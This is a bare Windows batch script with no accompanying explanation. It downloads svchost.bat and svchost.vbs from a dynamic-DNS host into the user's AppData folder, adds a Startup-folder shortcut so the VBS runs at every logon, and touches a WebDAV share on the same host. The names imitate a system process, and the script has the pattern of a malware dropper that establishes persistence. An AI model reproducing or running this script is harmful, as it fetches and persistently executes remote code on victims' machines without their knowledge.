cd %userprofile%\AppData\Local
powershell wget http://jajaja.servehttp.com/svchost.bat -outfile svchost.bat
powershell wget http://jajaja.servehttp.com/svchost.vbs -outfile svchost.vbs
cd %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('svchost.lnk');$s.TargetPath='%userprofile%\AppData\Local\svchost.vbs';$s.Save()"
net use B: \\jajaja.servehttp.com\webdav /persistent:no
net use B: /delete
